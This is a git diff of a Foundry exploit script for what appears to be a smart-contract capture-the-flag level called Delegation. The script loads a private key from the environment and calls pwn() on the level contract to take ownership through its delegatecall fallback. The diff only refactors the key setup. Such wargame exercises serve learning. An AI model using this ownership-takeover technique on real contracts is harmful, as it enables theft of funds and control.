@@ -235,13 +235,12 @@ contract DelegationTest is Test {
 contract Exploit is Script {
 
         Delegation level = Delegation(instance);   
-        address instance = vm.envAddress("INSTANCE_LEVEL6");
-        uint256 hacker = vm.envUint("PRIVATE_KEY");   
-        address deployer = vm.rememberKey(hacker);  
+        address instance = vm.envAddress("INSTANCE_LEVEL6"); 
+        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
         
         function run() external {
 
-            vm.startBroadcast(deployer);
+            vm.startBroadcast(hacker);
             (bool success, ) = address(level).call(
                 abi.encodeWithSignature("pwn()")
             );
